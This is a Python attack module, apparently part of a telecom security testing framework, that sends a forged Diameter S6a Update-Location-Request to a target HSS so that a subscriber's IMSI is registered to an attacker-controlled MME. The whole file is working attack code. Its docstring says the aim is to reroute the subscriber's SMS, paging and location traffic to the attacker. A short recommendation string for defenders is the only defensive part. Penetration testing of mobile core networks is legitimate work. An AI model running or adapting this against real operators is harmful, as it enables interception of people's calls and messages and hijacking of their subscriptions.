#!/usr/bin/env python3
'''
S6a Update-Location-Request (ULR) attack.

Sending an ULR that claims to be the subscriber's serving MME registers the
attacker's Origin-Host as the current MME in the HSS.  If accepted, subsequent
paging, SMS and location procedures for that subscriber are routed to the
attacker - the Diameter analogue of the SS7 UpdateLocation interception attack.

    main(config_file, target, listening, verbosity, output_file)
'''
from diameter.diameter_core.diameter_config_parser import DiameterConfig
from diameter.diameter_core.messages.s6a import update_location_request
from diameter.attacks.runner import targets, open_s6a, send_and_report
from diameter.commons.utilities import logErr, logInfo

TAG = 'S6A-ULR'

RECOMMENDATION = ('an HSS must validate that Update-Location requests come from '
                  'the subscriber\'s legitimate, roaming-agreement-bound MME; '
                  'unauthorized ULR acceptance enables SMS/call interception and '
                  'subscriber hijack.')


def main(config_file, target, listening=True, verbosity=2, output_file=None):
    if not config_file:
        logErr('Set a config file ("set config <file>") with the [IES] IMSI/MCC/MNC.',
               TAG=TAG)
        return
    if not target:
        logErr('No target set. Use "set target <hss-ip>".', TAG=TAG)
        return
    try:
        cfg = DiameterConfig(config_file)
    except Exception as e:
        logErr('Bad config: %s' % e, TAG=TAG)
        return

    results = []
    for host in targets(target):
        conn, _, _ = open_s6a(cfg, host, TAG)
        if conn is None:
            continue
        try:
            msg = update_location_request(
                cfg.origin_host, cfg.origin_realm, cfg.dest_realm, cfg.imsi,
                cfg.mcc, cfg.mnc, dest_host=cfg.dest_host)
            code = send_and_report(
                conn, host, msg, TAG,
                'subscriber %s now registered to attacker MME %s'
                % (cfg.imsi, cfg.origin_host),
                RECOMMENDATION)
            results.append((host, code))
        finally:
            conn.close()

    if not results:
        logInfo('No HSS answered the ULR.', TAG=TAG)
    return results
